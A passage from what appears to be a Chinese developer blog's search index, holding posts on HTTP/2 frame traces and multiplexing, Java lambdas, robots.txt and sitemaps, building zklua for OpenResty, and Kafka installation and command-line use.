class="line">          (dep_stream_id=0, weight=201, exclusive=0)                         -- dep_stream_id 依赖的流  weight 权重</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=5&gt;</span><br><span class="line">          (dep_stream_id=0, weight=101, exclusive=0)</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=7&gt;</span><br><span class="line">          (dep_stream_id=0, weight=1, exclusive=0)</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=9&gt;</span><br><span class="line">          (dep_stream_id=7, weight=1, exclusive=0)</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=11&gt;</span><br><span class="line">          (dep_stream_id=3, weight=1, exclusive=0)</span><br><span class="line">[  0.019] send HEADERS frame &lt;length=43, flags=0x25, stream_id=13&gt;           -- 报头帧 请求头或响应头，同时也用于打开一个流。</span><br><span class="line">          ; END_STREAM | END_HEADERS | PRIORITY       </span><br><span class="line">          (padlen=0, dep_stream_id=11, weight=16, exclusive=0)</span><br><span class="line">          ; Open new stream</span><br><span class="line">          :method: GET</span><br><span class="line">          :path: /</span><br><span class="line">          :scheme: https</span><br><span class="line">          :authority: h2.kekek.cc</span><br><span class="line">          accept: */*</span><br><span class="line">          accept-encoding: gzip, deflate</span><br><span class="line">          user-agent: nghttp2/1.32.0</span><br><span class="line">[  0.020] recv SETTINGS frame &lt;length=0, flags=0x01, stream_id=0&gt;</span><br><span class="line">          ; ACK</span><br><span class="line">          (niv=0)</span><br><span class="line">[  0.020] recv (stream_id=13) :method: GET</span><br><span class="line">[  0.021] recv (stream_id=13) :path: /css/index.css</span><br><span class="line">[  0.021] recv (stream_id=13) :scheme: https</span><br><span class="line">[  0.021] recv (stream_id=13) :authority: h2.kekek.cc</span><br><span class="line">[  0.021] recv (stream_id=13) accept-encoding: gzip, deflate</span><br><span class="line">[  0.021] recv (stream_id=13) user-agent: nghttp2/1.32.0</span><br><span class="line">[  0.021] recv PUSH_PROMISE frame &lt;length=71, flags=0x04, stream_id=13&gt;       -- 承诺推送帧</span><br><span class="line">          ; END_HEADERS</span><br><span class="line">          (padlen=0, promised_stream_id=2)</span><br><span class="line">[  0.021] recv (stream_id=13) :status: 200</span><br><span class="line">[  0.021] recv (stream_id=13) server: nginx/1.13.12</span><br><span class="line">[  0.021] recv (stream_id=13) date: Thu, 31 May 2018 06:17:14 GMT</span><br><span class="line">[  0.021] recv (stream_id=13) content-type: text/html</span><br><span class="line">[  0.021] recv (stream_id=13) last-modified: Thu, 24 May 2018 07:28:34 GMT</span><br><span class="line">[  0.021] recv (stream_id=13) etag: W/&quot;5b0669a2-67c&quot;</span><br><span class="line">[  0.021] recv (stream_id=13) content-encoding: gzip</span><br><span class="line">[  0.021] recv HEADERS frame &lt;length=107, flags=0x04, stream_id=13&gt;</span><br><span class="line">          ; END_HEADERS</span><br><span class="line">          (padlen=0)</span><br><span class="line">          ; First response header</span><br><span class="line">[  0.021] recv DATA frame &lt;length=638, flags=0x01, stream_id=13&gt;              -- DATA 数据帧，用来携带HTTP请求或响应</span><br><span class="line">          ; END_STREAM                                                        -- END_STREAM 0x01用来表示当前帧是当前流的最后一帧</span><br><span class="line">[  0.021] recv (stream_id=2) :status: 200</span><br><span class="line">[  0.021] recv (stream_id=2) server: nginx/1.13.12</span><br><span class="line">[  0.021] recv (stream_id=2) date: Thu, 31 May 2018 06:17:14 GMT</span><br><span class="line">[  0.021] recv (stream_id=2) content-type: text/css</span><br><span class="line">[  0.021] recv (stream_id=2) last-modified: Thu, 24 May 2018 07:28:32 GMT</span><br><span class="line">[  0.021] recv (stream_id=2) etag: W/&quot;5b0669a0-1bcd&quot;</span><br><span class="line">[  0.021] recv (stream_id=2) content-encoding: gzip</span><br><span class="line">[  0.021] recv HEADERS frame &lt;length=106, flags=0x04, stream_id=2&gt;</span><br><span class="line">          ; END_HEADERS</span><br><span class="line">          (padlen=0)</span><br><span class="line">          ; First push response header</span><br><span class="line">[  0.021] recv DATA frame &lt;length=1857, flags=0x01, stream_id=2&gt;</span><br><span class="line">          ; END_STREAM</span><br><span class="line">[  0.021] send GOAWAY frame &lt;length=8, flags=0x00, stream_id=0&gt;</span><br><span class="line">          (last_stream_id=2, error_code=NO_ERROR(0x00), opaque_data(0)=[])</span><br></pre></td></tr></table></figure><h3 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h3><p>HTTP1.x一个连接只能处理一个请求，开启<code>keep-alive</code>后可以复用连接（前一个处理完后复用），HTTP2可以一个连接同时处理多个请求响应。对于每个域名浏览器打开一个连接就能同时处理多个请求响应，这将突破http&#x2F;1.1协议下浏览器对于同一个域名最大连接数的限制。客户端和服务器可以将 HTTP 消息分解为互不依赖的帧，然后交错发送，最后再在另一端把它们重新组装起来。</p><p><img src="/images/http2-multiplexing.png"></p><p>下面我们做一个测试，在<code>http/1.1</code>模式和<code>http2</code>协议下分别访问下面页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img.png?_=1&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img_1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img.png?_=2&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img_2&quot;</span> <span class="attr">width</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">&lt;!-- 共加载100张图片 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img.png?_=100&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img_100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们查看服务器连接，可以看到443端口（http2）只有1个连接，而80端口（http&#x2F;1.1）有6（Chrome下）个连接。</p><p><img src="/images/http2-connections.png"></p><blockquote><p>测试时发现http&#x2F;1.1下多个连接比http2的多路复用更稳定，http2测试过程中没有能加载出来100张全部图片。</p></blockquote><p>** HTTP1.1 vs HTTP2 **<br><img src="/images/http1vshttp2.jpg"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://imququ.com/post/http2-resource.html">HTTP&#x2F;2 资料汇总</a></li><li><a href="https://www.phpsong.com/2818.html">nginx配置http2无效不起作用</a></li><li><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn">HTTP&#x2F;2 简介</a></li><li><a href="https://github.com/creeperyang/blog/issues/23">HTTP2简介和基于HTTP2的Web优化</a></li><li><a href="https://w3ctech.com/topic/862">借助 HTTP&#x2F;2 打造更迅捷的 Web 体验</a></li><li><a href="http://www.cnblogs.com/etoah/p/5891285.html">HTTP2特性预览和抓包分析</a></li><li><a href="https://www.nihaoshijie.com.cn/index.php/archives/698/">HTTP2.0关于多路复用的研究</a></li><li><a href="https://httpwg.org/specs/rfc7540.html">Hypertext Transfer Protocol Version 2 (HTTP&#x2F;2)</a></li><li><a href="https://book.douban.com/subject/25856314/">Web性能权威指南</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> http2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exception</title>
      <link href="/post/exception.html"/>
      <url>/post/exception.html</url>
      
        <content type="html"><![CDATA[<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>不同语言的异常</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java Lambda</title>
      <link href="/post/java-lambda.html"/>
      <url>/post/java-lambda.html</url>
      
        <content type="html"><![CDATA[<h2 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h2><p><img src="/images/Java+Lambda.png"><br>&lt;<a href="http://naotu.baidu.com/file/6f48a8bf61f964bd63b986bdb83c2e79?token=11d0ce93b785bbf2">http://naotu.baidu.com/file/6f48a8bf61f964bd63b986bdb83c2e79?token=11d0ce93b785bbf2</a>&gt;</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>单词转大写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sentence</span> <span class="operator">=</span> <span class="string">&quot;Start Using Java Lambda Expressions&quot;</span>;</span><br><span class="line">List&lt;String&gt; words = Arrays.stream(sentence.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">                .map(String::toUpperCase)</span><br><span class="line">                .collect(toList());</span><br></pre></td></tr></table></figure><p>获取字符串的单词长度和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sentence</span> <span class="operator">=</span> <span class="string">&quot;Start Using Java Lambda Expressions&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> Arrays.stream(sentence.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">                .map(String::length)</span><br><span class="line">                .reduce(<span class="number">0</span>, Integer::sum)</span><br><span class="line">                .intValue();;</span><br></pre></td></tr></table></figure><p>奇偶数分组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Boolean, List&lt;Integer&gt;&gt; res = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>).stream().collect(partitioningBy(i -&gt; (i % <span class="number">2</span> == <span class="number">0</span>)));</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] args = ...;</span><br><span class="line">Arrays.stream(args).map(String::valueOf).collect(Collectors.joining(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seo</title>
      <link href="/post/seo.html"/>
      <url>/post/seo.html</url>
      
        <content type="html"><![CDATA[<h2 id="SEO"><a href="#SEO" class="headerlink" title="SEO"></a>SEO</h2><h3 id="Robots"><a href="#Robots" class="headerlink" title="Robots"></a>Robots</h3><p>爬虫协议。规定为小写的<code>robots.txt</code>，放在网站根目录。用于告诉爬虫此网站中的哪些内容是不应被搜索引擎的爬虫获取的，哪些是可以被爬虫获取的。</p><p><code>Robots</code>主要包含以下几大部分</p><ul><li><p>User-agent</p><p>  对特定机器人进行配置。常见的有<code>Baiduspider</code>、<code>Googlebot</code>、<code>Bingbot</code>、<code>360Spider</code>、<code>Sogouspider</code>。可以设置为<code>*</code>代表所有。<a href="https://www.taobao.com/robots.txt">淘宝</a>、<a href="https://www.oschina.net/robots.txt">OSChina</a></p></li><li><p>Disallow</p><p>  指定那些目录下是不可以被抓取的。</p></li><li><p>Allow </p><p>  指定那些目录下是可以被抓取的。</p><blockquote><p>一些爬虫支持一项Allow指令，可以先写多个Disallow最后写Allow指令。</p></blockquote></li><li><p>Sitemap </p><p>  站点地图。方便爬虫进行抓取，里面是站内网站的地址。</p></li><li><p>Crawl-delay</p><p>  抓取间隔。<code>Crawl-delay: 10</code>指在爬虫两次进入站点时间隔为<code>10</code>秒。<em>部分搜索引擎会忽略</em></p></li></ul><p>本站的<code>robots.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /search</span><br><span class="line">Allow: /</span><br><span class="line">Sitemap: https://kekek.cc/sitemap.xml</span><br></pre></td></tr></table></figure><p>次规则适用于所有爬虫，<code>/search</code>下的内容不可以被抓去，其它所有网址都可以被抓去。站点地图地址为<code>https://kekek.cc/sitemap.xml</code>。</p><h3 id="sitemap"><a href="#sitemap" class="headerlink" title="sitemap"></a>sitemap</h3><p>站点地图。主要为xml格式，里面包含站内网页的连接。</p><p>主要属性：</p><ul><li><p>lastmod</p><p>  页面最后修改时间</p></li><li><p>loc </p><p>  页面永久链接地址</p></li><li><p>priority</p><p>  相对于其他页面的优先权</p></li></ul><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">urlset</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>https://kekek.cc/baidu_verify_V1VRvzkxVm.html<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastmod</span>&gt;</span>2018-05-04T10:38:47.003Z<span class="tag">&lt;/<span class="name">lastmod</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>https://kekek.cc/2017/03/23/bitwise-permission/<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastmod</span>&gt;</span>2018-05-03T12:53:55.729Z<span class="tag">&lt;/<span class="name">lastmod</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">urlset</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><p>访问<a href="https://www.google.com/webmasters/tools/home?hl=zh-CN">https://www.google.com/webmasters/tools/home?hl=zh-CN</a>添加站点。</p><p><img src="/images/WX20180504-191101@2x.png"></p><h3 id="Baidu"><a href="#Baidu" class="headerlink" title="Baidu"></a>Baidu</h3><p>访问<a href="https://ziyuan.baidu.com/linksubmit/index">https://ziyuan.baidu.com/linksubmit/index</a>添加站点。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>openresty-zookeeper</title>
      <link href="/post/openresty-zookeeper.html"/>
      <url>/post/openresty-zookeeper.html</url>
      
        <content type="html"><![CDATA[<p>编译zookeeper </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install </span><br></pre></td></tr></table></figure><p><a href="https://github.com/forhappy/zklua.git">zklua</a></p><p>如果lua是openresy自带的，需要<code>export =/usr/loacal/openresty/luajit/</code>。下载后编译<code>make</code>，编译出错可以尝试使用<a href="https://github.com/forhappy/zklua">https://github.com/forhappy/zklua</a>。</p><p>ldd zklua.so 查看引用有没有缺失的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ldd zklua.so</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffcecf7a000)</span><br><span class="line">librt.so.1 =&gt; /lib64/librt.so.1 (0x00007fb2597ff000)</span><br><span class="line">libm.so.6 =&gt; /lib64/libm.so.6 (0x00007fb25957b000)</span><br><span class="line">libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007fb259376000)</span><br><span class="line">libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007fb259159000)</span><br><span class="line">libzookeeper_mt.so.2 =&gt; /lib64/libzookeeper_mt.so.2 (0x00007fb258f3f000)</span><br><span class="line">libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fb258baa000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007fb259c17000)</span><br></pre></td></tr></table></figure><p>如果<code>libzookeeper_mt.so.2</code>缺失，将<code>/usr/local/lib/libzookeeper_mt.so.2</code>链接到<code>/lib64/libzookeeper_mt.so.2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/lib/libzookeeper_mt.so.2 /lib64/libzookeeper_mt.so.2</span><br></pre></td></tr></table></figure><p><a href="http://san-yun.iteye.com/blog/1973552">http://san-yun.iteye.com/blog/1973552</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kafka 快速开始</title>
      <link href="/post/kafka.html"/>
      <url>/post/kafka.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h3><p>从<a href="http://kafka.apache.org/">官网</a>下载最新的二进制包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirror.bit.edu.cn/apache/kafka/0.10.2.0/kafka_2.10-0.10.2.0.tgz</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf kafka_2.10-0.10.2.0.tgz -C /usr/local</span><br></pre></td></tr></table></figure><blockquote><p>Kafka 依赖 Zookeeper，首先要安装 Zookeeper。使用说明参考<a href="/2017/04/28/zookeeper/">Zookeeper快速开始</a></p></blockquote><p><a href="https://cwiki.apache.org/confluence/display/KAFKA/Kafka+data+structures+in+Zookeeper">Kafka 数据在 Zookeeper 中的存储结构</a></p><p>新旧版本的存储结构不同，主要在于 Consumer offset 的保存，旧版保存在 Zookeeper 中，新版保存在 kafka 中。</p><p>0.8 等早期版本在 Zookeeper 中的存储结构<br><img src="/images/hW6hL.png"></p><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><ul><li><p>Broker<br>  Kafka集群包含一个或多个服务器，这种服务器被称为broker</p></li><li><p>Topic<br>  每条发布到 Kafka 集群的消息都有一个类别，这个类别被称为 Topic 。（物理上不同 Topic 的消息分开存储，逻辑上一个topic的消息虽然保存于一个或多个broker上但用户只需指定消息的 Topic 即可生产或消费数据而不必关心数据存于何处）</p></li><li><p>Partition<br>  Partition 是物理上的概念，每个 Topic 包含一个或多个 Partition ，创建 Topic 时可指定 Partition 数量。每个 Partition 对应于一个文件夹，该文件夹下存储该 Partition 的数据和索引文件</p></li><li><p>Producer<br>  负责发布消息到Kafka broker</p></li><li><p>Consumer<br>  消费消息。每个 Consumer 属于一个特定的 Consumer group（可为每个 Consumer 指定 group name，若不指定 group name 则属于默认的 group ）。使用 consumer high level API 时，同一 Topic 的一条消息只能被同一个 consumer group 内的一个 consumer 消费，但多个 consumer group 可同时消费这一消息。</p></li></ul><h3 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h3><h4 id="KafkaOffsetMonitor"><a href="#KafkaOffsetMonitor" class="headerlink" title="KafkaOffsetMonitor"></a>KafkaOffsetMonitor</h4><blockquote><p>GitHub 项目主页 README 示例有错误。最新版未发布release，需要自己下载源码编译。</p></blockquote><ol><li><p>下载编译</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git ccone https://github.com/quantifind/KafkaOffsetMonitor.git</span><br><span class="line">cd KafkaOffsetMonitor</span><br><span class="line">sbt assembly</span><br></pre></td></tr></table></figure><blockquote><p>brew install sbt<br>编译完在target目录中</p></blockquote></li><li><p>运行</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java -cp KafkaOffsetMonitor-assembly-0.3.0-SNAPSHOT.jar \</span><br><span class="line">    com.quantifind.kafka.offsetapp.OffsetGetterWeb \</span><br><span class="line">    --offsetStorage kafka \</span><br><span class="line">    --zk 127.0.0.1:2181 \</span><br><span class="line">    --port 8989 \</span><br><span class="line">    --refresh 10.seconds \</span><br><span class="line">    --retain 2.days</span><br></pre></td></tr></table></figure><ul><li><p>offsetStorage offset 存储的位置，支持 zookeeper、kafka、storm。从 kafka 0.10.x 默认偏移量建议存储到 kafka 中。consumer 以 <code>zookeeper.connect</code> 方式连接到 kafka 的 offset 存储在 zookeeper 中，以 <code>bootstrap.servers</code> 方式连接到 kafka 的 offset 存储在 kafka <code>__consumer_offsets</code> topic 中。</p></li><li><p>zk kafka 连接的 zookeeper 地址 （无论使用哪一种类型的 offsetStorage ，这里都是 zookeeper 的地址。</p></li><li><p>offsetStorage valid options are ‘’zookeeper’’, ‘’kafka’’ or ‘’storm’’. Anything else falls back to ‘’zookeeper’’</p></li><li><p>zk the ZooKeeper hosts</p></li><li><p>port on what port will the app be available</p></li><li><p>refresh how often should the app refresh and store a point in the DB</p></li><li><p>retain how long should points be kept in the DB</p></li><li><p>dbName where to store the history (default ‘offsetapp’)</p></li><li><p>kafkaOffsetForceFromStart only applies to ‘’kafka’’ format. Force KafkaOffsetMonitor to scan the commit messages from start (see notes below)</p></li><li><p>stormZKOffsetBase only applies to ‘’storm’’ format. Change the offset storage base in zookeeper, default to ‘’&#x2F;stormconsumers’’ (see notes below)</p></li><li><p>pluginsArgs additional arguments used by extensions (see below)</p></li></ul></li></ol><blockquote><p>监控图表参数说明</p></blockquote><ul><li>Topic：创建Topic名称</li><li>Partition：分区编号</li><li>Offset：表示该Parition已经消费了多少Message</li><li>LogSize：表示该Partition生产了多少Message</li><li>Lag：表示有多少条Message未被消费</li><li>Owner：表示消费者</li><li>Created：表示该Partition创建时间</li><li>Last Seen：表示消费状态刷新最新时间</li></ul><p>正常的情况下 LogSize &#x3D; Offset + Lag。LogSize 和 Offset 线重合表示消费完毕。Lag 斜率持续比 Offset 大，需要此时应该考虑添加 consumer 。</p><h3 id="Kafka-命令行工具"><a href="#Kafka-命令行工具" class="headerlink" title="Kafka 命令行工具"></a>Kafka 命令行工具</h3><h4 id="Topic-相关"><a href="#Topic-相关" class="headerlink" title="Topic 相关"></a>Topic 相关</h4><ol><li><p>创建 Topic</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --create --zookeeper zk01.example.com:2181 --replication-factor 1 --partitions 3 --topic your_topic_name</span><br></pre></td></tr></table></figure><ul><li>replication-factor 副本数量</li><li>partitions Partition 数量</li></ul></li><li><p>列出所有的 Topic</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --zookeeper zk01.example.com:2181 --list</span><br></pre></td></tr></table></figure></li><li><p>删除 Topic</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --delete --zookeeper zk01.example.com:2181 --topic your_topic_name</span><br></pre></td></tr></table></figure><blockquote><p>需要在 <code>server.properties</code> 中设置 <code>delete.topic.enable=true</code><br>另外需要注意：如果当前 Topic 没有传输过信息是彻底删除。如果已经传输过数据，只是将此 Topic 标记为删除。</p></blockquote></li></ol><h4 id="Producer-相关"><a href="#Producer-相关" class="headerlink" title="Producer 相关"></a>Producer 相关</h4><ol><li>生产消息 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-producer.sh --broker-list broker1:9092 --topic your_topic_name</span><br></pre></td></tr></table></figure> 或者直接从文件中读 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-producer.sh --broker-list broker1:9092 --topic streams-file-input &lt; file-input.txt</span><br></pre></td></tr></table></figure><blockquote><p>通过 <code>--producer.config</code> 参数指定 Producer 配置文件。<a href="https://kafka.apache.org/documentation/#producerconfigs">配置参考</a></p></blockquote></li></ol><h4 id="Consumer-相关"><a href="#Consumer-相关" class="headerlink" title="Consumer 相关"></a>Consumer 相关</h4><ol><li><p>消费消息</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh  --bootstrap-server broker1:9092 --topic your_topic_name --from-beginning</span><br></pre></td></tr></table></figure><ul><li>–from-beginning 设置消费者偏置位为最开始（默认为末尾）。</li></ul><blockquote><p>Consumer 其它配置信息可以通过 <code>--consumer-property</code> 参数配置，或者使用 <code>--consumer.config</code> 指定配置文件路径。e.g. <code>--consumer-property group.id=print</code> <a href="https://kafka.apache.org/documentation/#consumerconfigs">配置参数</a></p></blockquote></li></ol><h4 id="Consumer-Group"><a href="#Consumer-Group" class="headerlink" title="Consumer Group"></a>Consumer Group</h4><ol><li><p>列出所有的 Consumer Group</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server broker1:9092 --list</span><br></pre></td></tr></table></figure></li><li><p>列出来消费者的 offset</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server broker1:9092 --describe --group test-consumer-group</span><br></pre></td></tr></table></figure><blockquote><p>这里只显示客户端直接链接到 Kafka 集群上面的消费者信息，通过 zookeeper 连接的需要使用 <code>--zookeeper</code> 参数来代替 <code>--bootstrap-server</code>。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TOPIC      PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG      CONSUMER-ID     HOST     CLIENT-ID</span><br><span class="line">tp         1          38192           38192           0        -               -        -</span><br><span class="line">tp         0          37775           37775           0        -               -        -</span><br><span class="line">tp         2          37927           37927           0        -               -        -</span><br></pre></td></tr></table></figure><p> CURRENT-OFFSET：当前消费到的位置<br> LOG-END-OFFSET：队列最后的位置<br> LAG：未被消费的个数</p></blockquote></li><li><p>删除 Consumer Group</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server broker1:9092 --delete --group &lt;group-name&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://kafka.apache.org/documentation/">【1】</a><a href="https://mos.meituan.com/library/32/how-to-install-kafka-on-centos7/">【2】</a> <a href="http://blog.csdn.net/suifeng3051/article/details/38321043">【3】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vim 入门</title>
      <link href="/post/vim.html"/>
      <url>/post/vim.html</url>
      
        <content type="html"><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li>清除搜索高亮 <code>:noh</code></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper 快速开始</title>
      <link href="/post/zookeeper.html"/>
      <url>/post/zookeeper.html</url>
      
